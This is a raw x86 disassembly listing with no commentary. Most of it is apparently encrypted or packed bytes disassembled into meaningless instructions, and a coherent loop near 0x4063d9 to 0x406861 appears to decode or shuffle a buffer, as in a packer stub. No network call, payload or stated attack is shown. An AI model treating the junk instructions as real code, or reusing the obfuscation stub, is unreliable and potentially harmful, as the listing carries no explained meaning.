  406139:	mov    dl,0xdc
  40613b:	in     al,dx
  40613c:	fstp   QWORD PTR [edx]
  40613e:	cdq    
  40613f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406140:	pop    esi
  406141:	sub    eax,0x86ea2a92
  406146:	retf   
  406147:	loopne 0x4060ed
  406149:	pop    edx
  40614a:	loope  0x406109
  40614c:	cld    
  40614d:	adc    ah,dl
  40614f:	iret   
  406150:	call   0x8f5e8cd8
  406155:	(bad)
  406159:	mov    al,ds:0x4e21916c
  40615e:	out    0x32,al
  406160:	sub    BYTE PTR [edi],0xc0
  406163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406164:	stos   DWORD PTR es:[edi],eax
  406165:	mov    cl,0xe4
  406167:	add    edi,DWORD PTR [eax+0x4b4a785d]
  40616d:	(bad)  
  40616e:	aaa    
  40616f:	fst    DWORD PTR [eax+eax*2-0xa8b6390]
  406176:	and    eax,DWORD PTR [ecx-0x14]
  406179:	ins    DWORD PTR es:[edi],dx
  40617a:	hlt    
  40617b:	jns    0x4061b3
  40617d:	sub    BYTE PTR [esi-0x3],ch
  406180:	scas   eax,DWORD PTR es:[edi]
  406181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406182:	in     eax,dx
  406183:	ins    DWORD PTR es:[edi],dx
  406184:	sar    DWORD PTR ds:0xdcd6c5be,cl
  40618a:	push   ss
  40618b:	sub    ch,dh
  40618d:	ret    0xc5f9
  406190:	out    0xf3,al
  406192:	add    BYTE PTR [esi-0x7c62a0ee],dh
  406198:	ficomp DWORD PTR [esi+0x7377d38]
  40619e:	xchg   DWORD PTR [eax+0x5d],esi
  4061a1:	lock add DWORD PTR ds:0xada299c6,esi
  4061a8:	or     eax,0xae094e60
  4061ad:	std    
  4061ae:	cs stos DWORD PTR es:[edi],eax
  4061b0:	scas   al,BYTE PTR es:[edi]
  4061b1:	bound  esp,QWORD PTR [esp+esi*4-0x54]
  4061b5:	sub    edi,DWORD PTR [ecx]
  4061b7:	fdivr  st,st(3)
  4061b9:	push   ss
  4061ba:	leave  
  4061bb:	add    edx,edx
  4061bd:	adc    dl,dh
  4061bf:	mov    ebx,0xf1742155
  4061c4:	jno    0x406166
  4061c6:	or     BYTE PTR [eax-0x15],bh
  4061c9:	mov    dh,0xab
  4061cb:	data16 outs dx,BYTE PTR ds:[esi]
  4061cd:	cdq    
  4061ce:	jp     0x4061bf
  4061d0:	sub    BYTE PTR [bp+si-0x39],bh
  4061d4:	in     eax,0x60
  4061d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061d7:	stos   DWORD PTR es:[edi],eax
  4061d8:	call   0xb9c3:0xc5991eaa
  4061df:	cmp    esi,DWORD PTR ss:[ebp+0x66]
  4061e3:	xor    ch,bl
  4061e5:	xchg   edi,eax
  4061e6:	xor    BYTE PTR [ebx-0x46758ea5],al
  4061ec:	push   eax
  4061ed:	in     eax,0x21
  4061ef:	fs mov bl,0xfa
  4061f2:	xchg   DWORD PTR [ebp+esi*4+0x12],ebx
  4061f6:	dec    esp
  4061f7:	jecxz  0x4061dc
  4061f9:	add    BYTE PTR [ebp+0x2f361e6f],dh
  4061ff:	sbb    BYTE PTR [ebx+0x45794333],bl
  406205:	cmp    DWORD PTR [ebp+esi*2+0x7e],ecx
  406209:	mov    ebx,0xa15c075e
  40620e:	in     al,dx
  40620f:	scas   eax,DWORD PTR es:[edi]
  406210:	out    0x44,al
  406212:	shl    DWORD PTR [edi+ebx*4],1
  406215:	in     eax,0x92
  406217:	mov    dh,0x10
  406219:	xchg   ch,dl
  40621b:	pusha  
  40621c:	scas   al,BYTE PTR es:[edi]
  40621d:	sub    al,0xde
  40621f:	test   BYTE PTR [esi+ebp*2-0x78],bl
  406223:	lds    edi,FWORD PTR [edi+0x4f]
  406226:	sub    al,0x4f
  406228:	mov    edi,0x5aa27916
  40622d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40622e:	(bad)  
  40622f:	jmp    0xa185:0x35dda2dd
  406236:	lds    ebx,FWORD PTR [ebx]
  406238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406239:	aam    0xda
  40623b:	mov    ?,WORD PTR [edi+0x7f]
  40623e:	sbb    al,0xe0
  406240:	int3   
  406241:	pop    es
  406242:	adc    DWORD PTR [eax-0x6f],edx
  406245:	mov    DWORD PTR [ebp-0x4a439ae3],edx
  40624b:	inc    edi
  40624c:	add    ebx,ebx
  40624e:	cmp    BYTE PTR [ecx+0x9],0xda
  406252:	test   BYTE PTR [bp-0x73],bl
  406256:	pop    eax
  406257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406258:	popa   
  406259:	inc    ecx
  40625a:	inc    esi
  40625b:	xor    esi,esp
  40625d:	cmp    edi,DWORD PTR [ebx+0x74]
  406260:	inc    edi
  406261:	sbb    esi,ebx
  406263:	pusha  
  406264:	push   edi
  406265:	sub    al,0x9f
  406267:	(bad)  
  406268:	shr    BYTE PTR [ecx+0x1a473fe],1
  40626e:	push   ebx
  40626f:	and    esp,eax
  406271:	sahf   
  406272:	js     0x4062f2
  406274:	xor    BYTE PTR [edi],bl
  406276:	xor    eax,0x3815b481
  40627b:	int3   
  40627c:	hlt    
  40627d:	mov    ds:0x1d9208ef,al
  406282:	mov    eax,ds:0x88ceae13
  406287:	fidivr WORD PTR [esi+0x1b981ccb]
  40628d:	retf   
  40628e:	adc    eax,0x2deeb2ed
  406293:	jne    0x406308
  406295:	test   BYTE PTR [ebp-0x61],bl
  406298:	aaa    
  406299:	xchg   esp,eax
  40629a:	sbb    esp,ebp
  40629c:	popf   
  40629d:	imul   esp,DWORD PTR [edi-0x6b],0xf6cfb164
  4062a4:	pop    esp
  4062a5:	cwde   
  4062a6:	push   ecx
  4062a7:	mov    edx,0xfd07fa2d
  4062ac:	inc    ecx
  4062ad:	mov    BYTE PTR [ebx+0x35],dl
  4062b0:	outs   dx,DWORD PTR ds:[esi]
  4062b1:	outs   dx,DWORD PTR ds:[esi]
  4062b2:	jecxz  0x40631b
  4062b4:	cmp    DWORD PTR [edx],0x80295553
  4062ba:	retf   
  4062bb:	aam    0xd2
  4062bd:	sti    
  4062be:	xchg   edx,eax
  4062bf:	adc    al,BYTE PTR [ebp+0x20]
  4062c2:	dec    ebx
  4062c3:	ret    
  4062c4:	jne    0x40633a
  4062c6:	cmc    
  4062c7:	daa    
  4062c8:	daa    
  4062c9:	or     ah,BYTE PTR ss:[edi+edx*8-0x5b0b2357]
  4062d1:	or     DWORD PTR [edx+0x7a],edi
  4062d4:	push   esi
  4062d5:	mov    ebp,0xbe8632e5
  4062da:	mov    al,ds:0x411bf2a4
  4062df:	mov    ebp,0x6f13d398
  4062e4:	push   edx
  4062e5:	aaa    
  4062e6:	push   DWORD PTR [esi+0x7ae28090]
  4062ec:	sub    DWORD PTR [edx+0x2f],ebx
  4062ef:	inc    ebp
  4062f0:	int    0x91
  4062f2:	adc    bl,BYTE PTR [ebx]
  4062f4:	sbb    DWORD PTR [ebx],eax
  4062f6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4062f8:	inc    edi
  4062f9:	mov    al,ds:0xe80de861
  4062fe:	pop    esp
  4062ff:	mov    ch,0x57
  406301:	mov    eax,ds:0xc9175e08
  406306:	fsubr  QWORD PTR [edx]
  406308:	in     eax,dx
  406309:	pop    ds
  40630a:	xor    ch,dh
  40630c:	data16 fwait
  40630e:	cmp    eax,eax
  406310:	dec    ebp
  406311:	cli    
  406312:	out    0xe6,al
  406314:	mov    ah,BYTE PTR [eax-0x21]
  406317:	in     al,dx
  406318:	mov    edx,0x92c9d8e9
  40631d:	iret   
  40631e:	and    DWORD PTR [esi-0x3a06d341],edi
  406324:	cdq    
  406325:	xchg   cl,cl
  406327:	pop    ebp
  406328:	retf   0x53c4
  40632b:	push   edx
  40632c:	pop    ebx
  40632d:	ret    0x7224
  406330:	mov    eax,0xb53a3401
  406335:	rcr    edi,cl
  406337:	or     eax,0x7f2bf2c5
  40633c:	aam    0x34
  40633e:	mov    dl,0x9b
  406340:	or     bh,BYTE PTR [edi+0x41]
  406343:	js     0x4063a1
  406345:	push   edx
  406346:	xchg   edx,eax
  406347:	mov    cl,0x9
  406349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40634a:	shl    BYTE PTR ds:0x106b1409,1
  406350:	push   ecx
  406351:	jae    0x4062eb
  406353:	mov    dh,0xfe
  406355:	xor    esi,DWORD PTR [ebx-0x66]
  406358:	mov    al,0xda
  40635a:	cmp    DWORD PTR [edi],edx
  40635c:	popf   
  40635d:	inc    esi
  40635e:	dec    ebx
  40635f:	in     al,dx
  406360:	sti    
  406361:	push   cs
  406362:	loope  0x406369
  406364:	aaa    
  406365:	and    DWORD PTR [esi],esp
  406367:	out    dx,al
  406368:	rcl    BYTE PTR [edi-0x353d8523],1
  40636e:	push   ds
  40636f:	or     ch,BYTE PTR [ecx-0x50]
  406372:	xor    al,0x20
  406374:	aad    0xa5
  406376:	jbe    0x4063b5
  406378:	dec    ebp
  406379:	test   al,0x70
  40637b:	cmp    al,0xb8
  40637d:	jae    0x4063a0
  40637f:	mov    eax,0xa515bf11
  406384:	into   
  406385:	push   0xea250702
  40638a:	adc    DWORD PTR [edi+0x4d],ebp
  40638d:	jbe    0x40633a
  40638f:	sub    al,0x95
  406391:	scas   al,BYTE PTR es:[edi]
  406392:	xchg   esp,eax
  406393:	cdq    
  406394:	test   eax,0x6cb679e9
  406399:	mov    al,0xc
  40639b:	sub    DWORD PTR [ecx-0x4f],ebx
  40639e:	sbb    eax,0x19742d09
  4063a3:	outs   dx,DWORD PTR ds:[esi]
  4063a4:	pop    edx
  4063a5:	in     al,dx
  4063a6:	push   edi
  4063a7:	pop    edx
  4063a8:	shr    BYTE PTR [ecx-0x34],0x43
  4063ac:	sub    DWORD PTR [edi+eax*1-0x1726c2b2],ebx
  4063b3:	jmp    0xaf1681b9
  4063b8:	inc    esp
  4063b9:	stos   BYTE PTR es:[edi],al
  4063ba:	(bad)  
  4063bb:	enter  0x4dcd,0xa
  4063bf:	push   edi
  4063c0:	cld    
  4063c1:	xchg   esi,eax
  4063c2:	(bad)  
  4063c4:	adc    ebx,DWORD PTR [ecx-0x5e]
  4063c7:	jmp    0x344b824a
  4063cc:	push   eax
  4063cd:	cmp    ah,BYTE PTR [ecx]
  4063cf:	xor    bh,ah
  4063d1:	jge    0x4063a2
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	push   esp
  40645f:	dec    esp
  406460:	jno    0x406417
  406462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406463:	cmp    BYTE PTR [esi+0x7e],bh
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x4064cc
  40646b:	sbb    al,0xd3
  40646d:	xchg   ebx,eax
  40646e:	call   0x95dd:0x88cae2dd
  406475:	test   DWORD PTR [edx],esp
  406477:	scas   al,BYTE PTR es:[edi]
  406478:	outs   dx,DWORD PTR ds:[esi]
  406479:	xlat   BYTE PTR ds:[ebx]
  40647a:	push   es
  40647b:	dec    ebp
  40647c:	jge    0x406458
  40647e:	cmp    ebx,DWORD PTR [ebp+0x57]
  406481:	es lahf 
  406483:	sbb    cl,BYTE PTR [ebx+0x20]
  406486:	out    0x98,al
  406488:	adc    bh,BYTE PTR ds:0xd4d9ee03
  40648e:	jns    0x406489
  406490:	dec    esp
  406491:	outs   dx,BYTE PTR ds:[esi]
  406492:	sbb    eax,0xdc28680
  406497:	(bad)  
  406498:	and    ah,bl
  40649a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40649b:	cmp    eax,0xbae018e7
  4064a0:	dec    esp
  4064a1:	jge    0x4064ad
  4064a3:	jns    0x4064c6
  4064a5:	int    0xfe
  4064a7:	pop    ebx
  4064a8:	retf   
  4064a9:	stos   DWORD PTR es:[edi],eax
  4064aa:	sbb    al,0x55
  4064ac:	xchg   ecx,eax
  4064ad:	data16 jecxz 0x406484
  4064b0:	push   ebp
  4064b1:	inc    ecx
  4064b2:	adc    BYTE PTR [edx+edx*2+0x61],0x5
  4064b7:	test   al,0x28
  4064b9:	push   0x6d82e407
  4064be:	cmp    esi,DWORD PTR [ecx-0x1f]
  4064c1:	cs mov ah,0x72
  4064c4:	mov    al,ds:0x1fd5c2c4
  4064c9:	sub    dh,dh
  4064cb:	pop    esi
  4064cc:	fiadd  DWORD PTR [eax+ebx*2]
  4064cf:	ins    BYTE PTR es:[edi],dx
  4064d0:	xchg   DWORD PTR [edi*4-0x5170f18a],ecx
  4064d7:	push   DWORD PTR [ebx]
  4064d9:	pop    ss
  4064da:	push   edx
  4064db:	push   ebx
  4064dc:	or     bl,cl
  4064de:	jmp    0x40650c
  4064e0:	clc    
  4064e1:	mov    ebx,0xbc1cec3c
  4064e6:	in     eax,0x2c
  4064e8:	hlt    
  4064e9:	out    0x83,eax
  4064eb:	enter  0x2326,0x85
  4064ef:	cmp    esi,ebp
  4064f1:	clc    
  4064f2:	push   edx
  4064f3:	add    DWORD PTR [edx+edx*8],esp
  4064f6:	push   ds
  4064f7:	dec    edi
  4064f8:	dec    edi
  4064f9:	out    0xb2,al
  4064fb:	jmp    0x4064da
  4064fd:	imul   eax,DWORD PTR [ecx+0x2d],0xfffffff8
  406501:	(bad)  
  406502:	ds mov cl,0x6f
  406505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406507:	cmp    al,BYTE PTR [eax]
  406509:	or     ah,dl
  40650b:	inc    esp
  40650c:	sub    dh,BYTE PTR gs:[edi]
  40650f:	popa   
  406510:	inc    edx
  406511:	ins    DWORD PTR es:[edi],dx
  406512:	in     eax,dx
  406513:	(bad)  
  406514:	sbb    edi,DWORD PTR [eax+ebx*1-0x2e]
  406518:	nop
  406519:	jmp    0xd95d:0x866786f9
  406520:	or     DWORD PTR [esi],edi
  406522:	std    
  406523:	fnstcw WORD PTR [edi-0x58842fd0]
  406529:	inc    ecx
  40652a:	mov    DWORD PTR [ecx-0x55f99ff1],ecx
  406530:	sub    eax,0x7b26b858
  406535:	sbb    al,0x71
  406537:	scas   eax,DWORD PTR es:[edi]
  406538:	scas   eax,DWORD PTR es:[edi]
  406539:	and    BYTE PTR [esi-0x52],cl
  40653c:	push   ebx
  40653d:	mov    dl,0xb9
  40653f:	retf   0xee38
  406542:	loopne 0x40657c
  406544:	cmp    dh,BYTE PTR [eax+0x37]
  406547:	aad    0xd0
  406549:	xor    ah,0x2
  40654c:	aam    0x65
  40654e:	inc    esi
  40654f:	pushf  
  406550:	jb     0x406561
  406552:	aaa    
  406553:	js     0x40659e
  406555:	add    dl,BYTE PTR [esi-0x1f]
  406558:	push   edx
  406559:	ja     0x406501
  40655b:	inc    esp
  40655c:	cmp    bh,ah
  40655e:	pop    eax
  40655f:	dec    ecx
  406560:	jg     0x406552
  406562:	lds    ecx,FWORD PTR [edi]
  406564:	jmp    0x5a6a476e
  406569:	fs scas eax,DWORD PTR es:[edi]
  40656b:	inc    ebp
  40656c:	sahf   
  40656d:	sbb    edi,edi
  40656f:	dec    esi
  406570:	js     0x4065ce
  406572:	cmp    DWORD PTR [eax-0x60938a41],ebp
  406578:	daa    
  406579:	inc    ecx
  40657a:	ds jo  0x4065a2
  40657d:	inc    eax
  40657e:	addr16 aas 
  406580:	imul   ecx,DWORD PTR [eax],0x58
  406583:	mov    cl,0x14
  406585:	sbb    al,0x6e
  406587:	sbb    bh,BYTE PTR [edx-0x722e95bf]
  40658d:	mov    eax,ds:0xf2581aff
  406592:	(bad)  
  406593:	adc    ch,bh
  406595:	inc    edi
  406596:	ja     0x406521
  406598:	cmp    DWORD PTR [ebp-0x48],ecx
  40659b:	and    DWORD PTR [eax-0x379e20d0],0xc56647fa
  4065a5:	aam    0x62
  4065a7:	div    BYTE PTR [esi-0x6c36fd18]
  4065ad:	jmp    0xba616b2e
  4065b2:	adc    eax,0x23947a18
  4065b7:	sub    al,0x7e
  4065b9:	push   0x789bdad8
  4065be:	enter  0xd812,0x7b
  4065c2:	test   DWORD PTR [esi-0x286ad70a],esp
  4065c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065c9:	jl     0x406614
  4065cb:	ret    0x10ec
  4065ce:	es xchg ebx,eax
  4065d0:	mov    esp,0xb5b2595e
  4065d5:	ret    
  4065d6:	add    DWORD PTR ds:0xeaf2b393,esi
  4065dc:	mov    ah,BYTE PTR [esi-0x78]
  4065df:	mov    edx,0xabf90863
  4065e4:	mov    eax,ds:0x1c57d0fd
  4065e9:	mov    dh,0xbf
  4065eb:	push   eax
  4065ec:	sub    BYTE PTR [edi+0x7e],ah
  4065ef:	dec    ebx
  4065f0:	sub    ebx,DWORD PTR [eax]
  4065f2:	nop
  4065f3:	add    al,0xe7
  4065f5:	xchg   DWORD PTR [ecx-0x63],ecx
  4065f8:	pushf  
  4065f9:	ins    DWORD PTR es:[edi],dx
  4065fa:	adc    ebx,DWORD PTR [edx]
  4065fc:	pop    es
  4065fd:	sbb    eax,0xcaed300c
  406602:	ins    DWORD PTR es:[edi],dx
  406603:	stos   DWORD PTR es:[edi],eax
  406604:	xor    eax,0x272d3e8f
  406609:	push   0x42
  40660b:	stc    
  40660c:	jmp    0xbf99230f
  406611:	into   
  406612:	test   edi,ebp
  406614:	in     al,0x5
  406616:	cwde   
  406617:	jp     0x4065c3
  406619:	gs push eax
  40661b:	mov    ds:0xcd8921ab,al
  406620:	out    dx,eax
  406621:	arpl   WORD PTR [esi-0xf],di
  406624:	fisub  DWORD PTR [esi]
  406626:	and    BYTE PTR [esi+0x0],al
  406629:	sbb    edx,edi
  40662b:	mov    ebp,0x40c705b9
  406630:	and    BYTE PTR [esi+0x3c39ea29],ch
  406636:	pop    ecx
  406637:	gs stc 
  406639:	mov    BYTE PTR [eax],cl
  40663b:	sub    esi,DWORD PTR [ebx+0x54]
  40663e:	pop    edi
  40663f:	adc    BYTE PTR [ebx-0x8e71292],dl
  406645:	cmp    ebp,DWORD PTR [ecx+ecx*4+0x2f]
  406649:	sar    DWORD PTR [ecx],0xa0
  40664c:	sub    edi,DWORD PTR [esi]
  40664e:	cwde   
  40664f:	mov    esi,0xc637e09a
  406654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406655:	mov    esp,0xc1e2a585
  40665a:	outs   dx,DWORD PTR ds:[esi]
  40665b:	out    dx,al
  40665c:	sar    DWORD PTR [ecx+0x7badbe65],0xb5
  406663:	inc    edx
  406664:	mov    esp,0xafecb5ae
  406669:	dec    ebx
  40666a:	test   DWORD PTR [edx],0x6f39796d
  406670:	leave  
  406671:	les    edx,FWORD PTR [esi]
  406673:	mov    ds:0xe4bd3d32,al
  406678:	(bad)  
  406679:	dec    esi
  40667a:	bound  ebp,QWORD PTR [eax+0x40826e7e]
  406680:	data16 cmp BYTE PTR [esi-0x43],bh
  406684:	scas   al,BYTE PTR es:[edi]
  406685:	aam    0xa4
  406687:	cmp    al,0x10
  406689:	mov    edx,0xe6184644
  40668e:	div    BYTE PTR [esi]
  406690:	aas    
  406691:	dec    edi
  406692:	adc    al,0x8c
  406694:	mov    bh,0xf9
  406696:	das    
  406697:	(bad)  
  406698:	push   eax
  406699:	pusha  
  40669a:	mov    esp,0xa84473b8
  40669f:	dec    esp
  4066a0:	dec    ebp
  4066a1:	cmp    esp,DWORD PTR [edx+0x7]
  4066a4:	(bad)  
  4066a5:	stc    
  4066a6:	jmp    0x4066bd
  4066a8:	stos   BYTE PTR es:[edi],al
  4066a9:	mov    BYTE PTR [edx+0x715f7a22],dh
  4066af:	stc    
  4066b0:	or     BYTE PTR [ecx-0x6000eafe],cl
  4066b6:	sti    
  4066b7:	cmp    ah,ch
  4066b9:	jo     0x40671b
  4066bb:	add    BYTE PTR [edx-0x7a],0x37
  4066bf:	daa    
  4066c0:	xor    edx,edi
  4066c2:	out    0xbf,eax
  4066c4:	or     BYTE PTR [edx+0x69],0x72
  4066c8:	sar    BYTE PTR [edi+0x64],cl
  4066cb:	mov    dl,0x61
  4066cd:	jecxz  0x406710
  4066cf:	gs out dx,al
  4066d1:	stos   DWORD PTR es:[edi],eax
  4066d2:	jge    0x4066cf
  4066d4:	push   ebp
  4066d5:	xchg   esi,eax
  4066d6:	mov    al,ds:0x678c837a
  4066db:	(bad)  
  4066dc:	gs (bad) 
  4066de:	dec    edi
  4066df:	mov    esp,0x64f2c094
  4066e5:	pop    ecx
  4066e6:	mov    ecx,0x9ef4a792
  4066eb:	dec    ebx
  4066ec:	and    BYTE PTR fs:[ecx+0x31],ch
  4066f0:	addr16 sbb esp,edx
  4066f3:	xor    al,0x97
  4066f5:	scas   eax,DWORD PTR es:[edi]
  4066f6:	out    0xb2,eax
  4066f8:	push   ebx
  4066f9:	mov    edi,0x8e183d85
  4066fe:	fnstenv [ebx-0x270d7e61]
  406704:	adc    DWORD PTR [edi-0x65d8b3dd],esp
  40670a:	push   ds
  40670b:	and    bl,BYTE PTR [ebp+eax*1-0x65]
  40670f:	clc    
  406710:	rcl    DWORD PTR [ebp-0x74],1
  406713:	ins    DWORD PTR es:[edi],dx
  406714:	gs push edx
  406716:	retf   
  406717:	sbb    dl,BYTE PTR [eax+0x60]
  40671a:	mov    ah,BYTE PTR [eax-0x7]
  40671d:	shl    edi,cl
  40671f:	pop    ebx
  406720:	pop    ss
  406721:	call   0x8788c88
  406726:	pop    ss
  406727:	fcmovnu st,st(5)
  406729:	rcl    DWORD PTR [esi+0x3e],1
  40672c:	test   eax,0xf9695367
  406732:	pop    ds
  406733:	mov    ch,0x66
  406735:	inc    ebx
  406736:	inc    eax
  406737:	pushf  
  406738:	stos   BYTE PTR es:[edi],al
  406739:	aaa    
  40673a:	out    0x51,eax
  40673c:	iret   
  40673d:	in     eax,dx
  40673e:	xchg   esi,eax
  40673f:	sbb    eax,0x2aaf4d1e
  406744:	xor    cl,BYTE PTR [ecx]
  406746:	sub    DWORD PTR [eax-0x5130eaaf],ebp
  40674c:	data16 xor bh,BYTE PTR [edi-0x12e7a3d7]
  406753:	lock mov BYTE PTR [eax+0x4b94f446],al
  40675a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40675b:	call   0x9ac5:0x34b0ea1
  406762:	jbe    0x40676e
  406764:	or     ebx,ebp
  406766:	mov    ds:0x1f62d9db,al
  40676b:	(bad)  
  40676c:	aas    
  40676d:	cmp    DWORD PTR ds:[ebp+0x4e],ecx
  406771:	mov    dh,0x84
  406773:	pop    ecx
  406774:	pushf  
  406775:	sbb    ecx,DWORD PTR [eax-0x4f2e4ac7]
  40677b:	inc    edi
  40677c:	add    dh,BYTE PTR [ebx-0x41081b44]
  406782:	loopne 0x40671d
  406784:	mov    dl,0xe4
  406786:	popf   
  406787:	mov    ebx,0xe081cd34
  40678c:	(bad)  [eax-0xc39d4c5]
  406792:	scas   al,BYTE PTR es:[edi]
  406793:	js     0x40672a
  406795:	mov    ds:0xd1fda46c,eax
  40679a:	xchg   edx,eax
  40679b:	dec    esi
  40679c:	call   0x3fdd6648
  4067a1:	pop    esp
  4067a2:	int3   
  4067a3:	lock and ch,ch
  4067a6:	outs   dx,DWORD PTR ds:[esi]
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433747
  40686e:	mov    eax,ds:0x43375f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43366b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43366b
  40688f:	inc    eax
  406890:	mov    ds:0x43366b,eax
  406895:	cmp    DWORD PTR ds:0x43366b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43366b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433810
  4068b9:	push   0x433810
  4068be:	push   0x433767
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43366b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43366b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43366b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4336fb,0x433673
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43372f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43361f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4336b3,0x711c
